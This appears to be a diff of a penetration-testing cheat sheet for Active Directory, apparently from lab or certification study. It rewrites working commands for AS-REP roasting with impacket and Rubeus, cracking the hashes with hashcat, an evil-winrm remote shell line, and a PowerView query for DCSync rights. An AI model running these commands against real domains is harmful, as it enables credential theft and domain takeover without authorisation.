@@ -429,50 +429,34 @@ MD4(stdin)= 58a478135a93ac3bf058a5ea0e8fdb71
 
 ### Brute Force ASREP roast
 
-* To get user list of users use: `enum4linux`
-* If local access is give then use Rubeus: `Rubeus.exe asreproast`
+#### ASREP remotely
 
-```
-
-   1. Look for users via enum4linux or kerbrute. Delete stuff after first space: 
-   cut -d ' ' -f 1 < users.txt  
-      
-   2. Use ASREP roast against users in the ldapenum_asrep_users.txt file
-    
-	```
-   GetNPUsers.py xxx.com/xxx:xxx -usersfile usersall.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.11.1.xxx
-
-   impacket-GetNPUsers spookysec.local/ -no-pass -usersfile spookyusers.txt -format hashcat -outputfile spooky.hash -dc-ip 10.10.43.76
-   ```
-	
-	OR with Rubeus
-	
-	.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
-   
-   3. Use SPN roast against users in the ldapenum_spn_users.txt file
-   
-   Crack SPN roast and ASPREP roast output with hashcat
-   
-   hashcat -a 0 -m 18200 hc.txt  /usr/share/wordlists/rockyou.txt
-
-   #Attention: save as ANSI encoding using notepad.exe if cracked in windows
+```bash
+impacket-GetNPUsers corp.local/user101:Password101 -no-pass -format hashcat -outputfile spooky.hash -dc-ip "10.10.43.76" -request
 ```
 
 
-### Remote Shell
+#### ASREP locally
 
-* RPC: `evil-winrm -i 10.10.10.xxx -u 'xxx'  -p 'xxx' `
-* SMB: use some exploit from SMB cheat sheet
+`.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast`
 
+* crack hashes on Windows
 
+after copy-pasting sanitize the file removein spaces and newlines
 
+`cat hashes.asreproast | tr -d '\n' | tr -d ' '`
+
+add `$23$` if needed and save file using notepad++ as ANSI encoded file
+
+`hashcat -m 18200 -a 0 spooky.hash /usr/share/wordlists/rockyou.txt /usr/share/hashcat/rules/best64.rule --force`
+
+Rule file: `./rules/best64.rule`
 
 ### Dsync Attack
-Read about dsync here: https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync
 
 * Find accounts with permissions for DSync using **powerview**
 
-```
+```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
 
 ```
